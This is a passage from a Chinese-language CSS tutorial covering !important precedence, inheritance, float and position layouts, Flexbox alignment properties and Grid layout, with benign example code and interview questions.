class="headerlink" title="!important 终极权重"></a>!important 终极权重</h3><p><strong>权重等级表</strong></p><table><thead><tr><th align="left">来源</th><th align="left">示例</th><th align="left">权重值</th></tr></thead><tbody><tr><td align="left">用户代理!important</td><td align="left">浏览器默认样式</td><td align="left">∞+3</td></tr><tr><td align="left">用户!important</td><td align="left">用户自定义样式表</td><td align="left">∞+2</td></tr><tr><td align="left">作者!important</td><td align="left">开发者写的!important</td><td align="left">∞+1</td></tr><tr><td align="left">动画关键帧</td><td align="left">@keyframes</td><td align="left">∞</td></tr><tr><td align="left">普通作者声明</td><td align="left">常规CSS规则</td><td align="left">按选择器权重</td></tr></tbody></table><p><strong>破解 !important</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 原始问题样式 */</span><br><span class="hljs-selector-class">.btn</span> &#123; <span class="hljs-attribute">color</span>: red <span class="hljs-meta">!important</span>; &#125;<br><br><span class="hljs-comment">/* 解决方案1：更高权重!important */</span><br><span class="hljs-selector-tag">html</span> <span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.btn</span> &#123; <span class="hljs-attribute">color</span>: blue <span class="hljs-meta">!important</span>; &#125;<br><br><span class="hljs-comment">/* 解决方案2：JavaScript修改内联样式 */</span><br>element<span class="hljs-selector-class">.style</span><span class="hljs-selector-class">.setProperty</span>(&#x27;<span class="hljs-attribute">color</span>&#x27;, &#x27;green&#x27;, &#x27;important&#x27;);<br></code></pre></td></tr></table></figure><h3 id="继承规则"><a href="#继承规则" class="headerlink" title="继承规则"></a>继承规则</h3><p><strong>可继承属性清单</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">- 文本相关：`font-family`, `color`, `line-height`<br>- 列表相关：`list-style-type`<br>- 表格相关：`border-collapse`<br>- 可见性：`visibility`<br>- 光标：`cursor`<br></code></pre></td></tr></table></figure><p><strong>显式继承技巧</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.ant-input</span> &#123;<br>  <span class="hljs-attribute">font</span>: inherit;  <span class="hljs-comment">/* 强制继承父元素字体设置 */</span><br>  <span class="hljs-attribute">color</span>: inherit;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>继承链中断场景</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div style=&quot;font-size: 16px;&quot;&gt;<br>  &lt;span style=&quot;font-size: 1.5em;&quot;&gt;24px&lt;/span&gt;<br>  &lt;!-- 子元素设置非继承属性如width会中断 --&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><h1 id="第二章：CSS-布局技术"><a href="#第二章：CSS-布局技术" class="headerlink" title="第二章：CSS 布局技术"></a>第二章：CSS 布局技术</h1><h2 id="2-1-传统布局（浮动-float、定位-position）"><a href="#2-1-传统布局（浮动-float、定位-position）" class="headerlink" title="2.1 传统布局（浮动 float、定位 position）"></a>2.1 传统布局（浮动 float、定位 position）</h2><h3 id="浮动布局（float）"><a href="#浮动布局（float）" class="headerlink" title="浮动布局（float）"></a>浮动布局（float）</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.float-item</span> &#123;<br>  <span class="hljs-attribute">float</span>: left | right | none;<br>  <span class="hljs-attribute">clear</span>: both | left | right; <span class="hljs-comment">/* 清除浮动影响 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>核心机制</strong></p><ul><li>文档流破坏：浮动元素会脱离普通流，其他盒子会“无视它”（但文本内容会围绕）</li><li>包裹性：浮动元素会默认收缩宽度以适应内容（除非显式设置宽度）</li></ul><p><strong>经典应用场景</strong></p><p>（1）多栏布局（早期实现方式）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.left-col</span> &#123; <span class="hljs-attribute">float</span>: left; <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>; &#125;<br><span class="hljs-selector-class">.right-col</span> &#123; <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">210px</span>; &#125;<br></code></pre></td></tr></table></figure><p>（2）图文混排</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">img</span> &#123;<br>  <span class="hljs-attribute">float</span>: left;<br>  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">15px</span>;<br>  <span class="hljs-attribute">shape-outside</span>: <span class="hljs-built_in">circle</span>(); <span class="hljs-comment">/* 高级文字环绕 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>陷阱：高度塌陷问题</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS">&lt;<span class="hljs-selector-tag">div</span> class=&quot;parent&quot;&gt;<br>  &lt;<span class="hljs-selector-tag">div</span> class=&quot;<span class="hljs-attribute">float</span>-child&quot;&gt;&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;!-- parent高度为<span class="hljs-number">0</span> --&gt;<br></code></pre></td></tr></table></figure><h3 id="定位布局（position）-精准控制的利器"><a href="#定位布局（position）-精准控制的利器" class="headerlink" title="定位布局（position） - 精准控制的利器"></a>定位布局（position） - 精准控制的利器</h3><p><strong>各大定位类型对比</strong></p><table><thead><tr><th align="left">类型</th><th align="left">脱离文档流</th><th align="left">定位基准</th><th align="left">典型应用场景</th></tr></thead><tbody><tr><td align="left">static</td><td align="left">否</td><td align="left">正常流</td><td align="left">默认值</td></tr><tr><td align="left">relative</td><td align="left">否</td><td align="left">自身原始位置</td><td align="left">微调元素&#x2F;建立定位上下文</td></tr><tr><td align="left">absolute</td><td align="left">是</td><td align="left">最近非static祖先</td><td align="left">弹窗&#x2F;下拉菜单&#x2F;工具提示</td></tr><tr><td align="left">fixed</td><td align="left">是</td><td align="left">视口</td><td align="left">固定导航栏&#x2F;悬浮按钮</td></tr><tr><td align="left">sticky</td><td align="left">是（滚动时）</td><td align="left">最近滚动容器</td><td align="left">吸顶效果&#x2F;表头固定</td></tr></tbody></table><p><strong>粘性定位（sticky）的阈值控制</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.sticky-header</span> &#123;<br>  <span class="hljs-attribute">position</span>: sticky;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">20px</span>; <span class="hljs-comment">/* 距离视口顶部20px时触发固定 */</span><br>  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>失效条件：</p><ul><li>父元素设置 overflow: hidden</li><li>未指定 top&#x2F;bottom&#x2F;left&#x2F;right 任一值</li></ul><h2 id="2-2-Flex-弹性布局（flex-direction、justify-content、align-items）"><a href="#2-2-Flex-弹性布局（flex-direction、justify-content、align-items）" class="headerlink" title="2.2 Flex 弹性布局（flex-direction、justify-content、align-items）"></a>2.2 Flex 弹性布局（flex-direction、justify-content、align-items）</h2><p>flex 弹性布局最核心的三要素：</p><ul><li>flex-direction</li><li>justify-content</li><li>align-items</li></ul><h3 id="flex-direction-主轴方向控制"><a href="#flex-direction-主轴方向控制" class="headerlink" title="flex-direction - 主轴方向控制"></a>flex-direction - 主轴方向控制</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 响应式布局切换 */</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">flex-direction</span>: row;   <span class="hljs-comment">/* 桌面端 */</span><br>&#125;<br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">flex-direction</span>: column; <span class="hljs-comment">/* 移动端 */</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>作用</strong>：定义 Flex 容器的主轴方向，直接影响子项的排列方式</p><p><strong>属性详解</strong></p><table><thead><tr><th align="left">属性值</th><th align="left">效果图示</th><th align="left">典型应用场景</th></tr></thead><tbody><tr><td align="left">row（默认）</td><td align="left">→ → → →</td><td align="left">水平导航栏&#x2F;商品列表</td></tr><tr><td align="left">row-reverse</td><td align="left">← ← ← ←</td><td align="left">从右到左的特殊布局需求</td></tr><tr><td align="left">column</td><td align="left">↓</td><td align="left">移动端垂直菜单&#x2F;瀑布流</td></tr><tr><td align="left">column-reverse</td><td align="left">↑</td><td align="left">聊天消息时间倒序展示</td></tr></tbody></table><h3 id="justify-content-主轴对齐方式"><a href="#justify-content-主轴对齐方式" class="headerlink" title="justify-content - 主轴对齐方式"></a>justify-content - 主轴对齐方式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 表格工具栏布局 */</span><br><span class="hljs-selector-class">.toolbar</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">justify-content</span>: space-between; <span class="hljs-comment">/* 左右分组 */</span><br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">16px</span>;<br>&#125;<br><br><span class="hljs-comment">/* 弹性网格布局 */</span><br><span class="hljs-selector-class">.grid</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>  <span class="hljs-attribute">justify-content</span>: space-around; <span class="hljs-comment">/* 卡片四周留白均匀 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>作用</strong>：控制子项在主轴上的对齐与空间分配</p><p><strong>属性详解</strong></p><table><thead><tr><th align="left">属性值</th><th align="left">效果图示</th><th align="left">空间分配规则</th></tr></thead><tbody><tr><td align="left">flex-start</td><td align="left">[■ ■ ■]________</td><td align="left">向主轴起点聚集（默认）</td></tr><tr><td align="left">flex-end</td><td align="left">________[■ ■ ■]</td><td align="left">向主轴终点聚集</td></tr><tr><td align="left">center</td><td align="left"><code>____[■ ■ ■]____</code></td><td align="left">居中排列</td></tr><tr><td align="left">space-between</td><td align="left">[■][■][■]</td><td align="left">首尾贴边，中间均分</td></tr><tr><td align="left">space-around</td><td align="left">[■][■][■]</td><td align="left">每个项目两侧间距相等</td></tr><tr><td align="left">space-evenly</td><td align="left">[■][■][■]</td><td align="left">项目与容器间距完全均分</td></tr></tbody></table><h3 id="align-items-交叉轴对齐方式"><a href="#align-items-交叉轴对齐方式" class="headerlink" title="align-items - 交叉轴对齐方式"></a>align-items - 交叉轴对齐方式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 表单输入行对齐 */</span><br><span class="hljs-selector-class">.form-row</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: baseline; <span class="hljs-comment">/* 让label和input文字基线对齐 */</span><br>&#125;<br><br><span class="hljs-comment">/* 垂直居中终极方案 */</span><br><span class="hljs-selector-class">.modal</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: center;<br>  <span class="hljs-attribute">justify-content</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>作用</strong>：控制子项在交叉轴上的对齐方式（单行布局）</p><p><strong>属性详解</strong></p><table><thead><tr><th align="left">属性值</th><th align="left">对齐规则</th></tr></thead><tbody><tr><td align="left">stretch（默认）</td><td align="left">拉伸填满容器高度</td></tr><tr><td align="left">flex-start</td><td align="left">向交叉轴起点对齐</td></tr><tr><td align="left">flex-end</td><td align="left">向交叉轴终点对齐</td></tr><tr><td align="left">center</td><td align="left">居中对齐</td></tr><tr><td align="left">baseline</td><td align="left">按文本基线对齐</td></tr></tbody></table><h3 id="三属性联调实践"><a href="#三属性联调实践" class="headerlink" title="三属性联调实践"></a>三属性联调实践</h3><p>（1）圣杯布局实现</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.holy-grail</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-direction</span>: column;<br>  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span>, <span class="hljs-selector-class">.footer</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> auto;<br>&#125;<br><span class="hljs-selector-class">.content</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-direction</span>: row;<br>&#125;<br><span class="hljs-selector-class">.main</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-selector-class">.sidebar</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">order</span>: -<span class="hljs-number">1</span>; <span class="hljs-comment">/* 左侧边栏 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）等高卡片组</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card-group</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: stretch; <span class="hljs-comment">/* 关键设置 */</span><br>&#125;<br><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">/* 无需设置高度 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高频面试题"><a href="#高频面试题" class="headerlink" title="高频面试题"></a>高频面试题</h3><p>（1）justify-content: space-between 最后一行左对齐怎么实现？</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.grid</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>  <span class="hljs-attribute">justify-content</span>: space-between;<br>&#125;<br><span class="hljs-comment">/* 添加占位元素 */</span><br><span class="hljs-selector-class">.grid</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">flex</span>: auto; <span class="hljs-comment">/* 或固定宽度 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）如何让 flex 项目在交叉方向上溢出容器？</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: flex-start; <span class="hljs-comment">/* 关键设置 */</span><br>  <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）flex 实现两栏布局，右侧内容溢出时出现滚动条？</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.layout</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;<br>&#125;<br><span class="hljs-selector-class">.sidebar</span> &#123; <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">200px</span>; &#125;<br><span class="hljs-selector-class">.main</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-Grid-网格布局（grid-template、grid-area、fr-单位）"><a href="#2-3-Grid-网格布局（grid-template、grid-area、fr-单位）" class="headerlink" title="2.3 Grid 网格布局（grid-template、grid-area、fr 单位）"></a>2.3 Grid 网格布局（grid-template、grid-area、fr 单位）</h2><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><p>grid 布局属于二维布局模型：同时控制行和列的排布，与 flexbox （一维）形成互补</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid; <span class="hljs-comment">/* 开启网格布局 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="grid-template-系列属性详解"><a href="#grid-template-系列属性详解" class="headerlink" title="grid-template 系列属性详解"></a>grid-template 系列属性详解</h3><p><strong>grid-template-columns&#x2F;rows</strong></p><ul><li>作用：定义显示网格的列&#x2F;行尺寸<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid; <span class="hljs-comment">/* 开启网格布局 */</span><br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">200px</span> <span class="hljs-number">1</span>fr; <span class="hljs-comment">/* 两列：固定+弹性 */</span><br>  <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">80px</span> auto <span class="hljs-number">60px</span>; <span class="hljs-comment">/* 三行 */</span><br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>; <span class="hljs-comment">/* 网格间隙 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>grid-template-areas</strong></p><ul><li>作用：可视化布局声明<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.dashboard</span> &#123;<br>  <span class="hljs-attribute">grid-template-areas</span>:<br>    <span class="hljs-string">&quot;header header header&quot;</span><br>    <span class="hljs-string">&quot;sidebar content .&quot;</span><br>    <span class="hljs-string">&quot;footer footer footer&quot;</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span> &#123; <span class="hljs-attribute">grid-area</span>: header; &#125;<br><span class="hljs-comment">/* 其他区域同理 */</span><br></code></pre></td></tr></table></figure></li><li>规则：相同命名区域必须形成矩形；点号（.）表示空白区域</li></ul><p><strong>复合写法 <code>grid-template</code></strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 行 / 列 / 区域 */</span><br><span class="hljs-attribute">grid-template</span>: <br>  <span class="hljs-string">&quot;head head&quot;</span> <span class="hljs-number">80px</span><br>  <span class="hljs-string">&quot;nav main&quot;</span> <span class="hljs-number">1</span>fr<br>  / <span class="hljs-number">200px</span> <span class="hljs-number">1</span>fr;<br></code></pre></td></tr></table></figure><h3 id="grid-area-详解"><a href="#grid-area-详解" class="headerlink" title="grid-area 详解"></a>grid-area 详解</h3><p><strong>基础定义</strong></p><p>grid-area 是 CSS Grid 布局中用于精确控制网格项位置的核心属性，是以下属性的复合写法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">grid-row-start</span> / <span class="hljs-attribute">grid-column-start</span> / <span class="hljs-attribute">grid-row-end</span> / <span class="hljs-attribute">grid-column-end</span><br></code></pre></td></tr></table></figure><p><strong>四大核心功能</strong></p><p>（1）作为 <code>grid-template-areas</code> 的命名引用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">grid-template-areas</span>:<br>    <span class="hljs-string">&quot;header header&quot;</span><br>    <span class="hljs-string">&quot;sidebar main&quot;</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span> &#123; <span class="hljs-attribute">grid-area</span>: header; &#125; <span class="hljs-comment">/* 自动填充对应区域 */</span><br><span class="hljs-selector-class">.sidebar</span> &#123; <span class="hljs-attribute">grid-area</span>: sidebar; &#125;<br></code></pre></td></tr></table></figure><p>（2）作为定位简写（行开始&#x2F;列开始&#x2F;行结束&#x2F;列结束）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/*3 行 3 列共 9 格*/</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>fr); <span class="hljs-comment">/* 3 列 */</span><br>  <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">100px</span>); <span class="hljs-comment">/* 3 行 */</span><br>&#125;<br><span class="hljs-comment">/*第 2 行第 1 列开始，第 4 行第 3 列结束，占用第2-3行，第1-2列*/</span><br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: <span class="hljs-number">2</span> / <span class="hljs-number">1</span> / <span class="hljs-number">4</span> / <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）配合命名线使用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">grid-template-columns</span>: [main-start] <span class="hljs-number">1</span>fr [content-start] <span class="hljs-number">1</span>fr [main-end];<br>&#125;<br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: <span class="hljs-number">1</span> / content-start / <span class="hljs-number">3</span> / main-end;<br>&#125;<br></code></pre></td></tr></table></figure><p>（4）自适应布局案例</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) &#123;<br>  <span class="hljs-selector-class">.app</span> &#123;<br>    <span class="hljs-attribute">grid-template-areas</span>:<br>      <span class="hljs-string">&quot;header&quot;</span><br>      <span class="hljs-string">&quot;content&quot;</span><br>      <span class="hljs-string">&quot;sidebar&quot;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fr-单位-网格专属空间分配"><a href="#fr-单位-网格专属空间分配" class="headerlink" title="fr 单位 - 网格专属空间分配"></a>fr 单位 - 网格专属空间分配</h3><p><strong>核心特性</strong></p><ul><li>按比例分配容器剩余可用空间，与 Flex 的 flex-grow 类似但计算时机不同</li><li>与 <code>minmax()</code> 组合实现弹性限制<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">300px</span> <span class="hljs-built_in">minmax</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>fr) <span class="hljs-number">1</span>fr;<br></code></pre></td></tr></table></figure></li></ul><p><strong>计算规则</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">2</span>fr <span class="hljs-number">100px</span>;<br></code></pre></td></tr></table></figure><ul><li>总宽度 &#x3D; 容器宽度 - 固定列宽（100px）- 列间距（gap）</li><li>剩余空间按 1:2 比例分配</li></ul><p><strong>与百分比的区别</strong></p><table><thead><tr><th align="left">特性</th><th align="left">fr</th><th align="left">%</th></tr></thead><tbody><tr><td align="left">计算基准</td><td align="left">剩余空间</td><td align="left">父容器总空间</td></tr><tr><td align="left">是否受网格间隙（gap）影响</td><td align="left">分配前扣除gap</td><td align="left">包含gap</td></tr><tr><td align="left">组合弹性</td><td align="left">可与固定宽度混合</td><td align="left">需配合calc</td></tr></tbody></table><h3 id="高频面试问题"><a href="#高频面试问题" class="headerlink" title="高频面试问题"></a>高频面试问题</h3><p>（1）grid-area 如何实现跨行跨列</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 跨3行2列 */</span><br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: <span class="hljs-number">2</span> / <span class="hljs-number">1</span> / span <span class="hljs-number">3</span> / span <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）同名 grid-area 的项目会发生什么</p><ul><li>根据 DOM 顺序层叠（后者覆盖前者），可通过 z-index 控制层级</li></ul><p>（3）如何使用 grid-area 实现圣杯布局</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">grid-template-areas</span>:<br>    <span class="hljs-string">&quot;header header&quot;</span><br>    <span class="hljs-string">&quot;sidebar main&quot;</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span> &#123; <span class="hljs-attribute">grid-area</span>: header; &#125;<br><span class="hljs-selector-class">.sidebar</span> &#123; <span 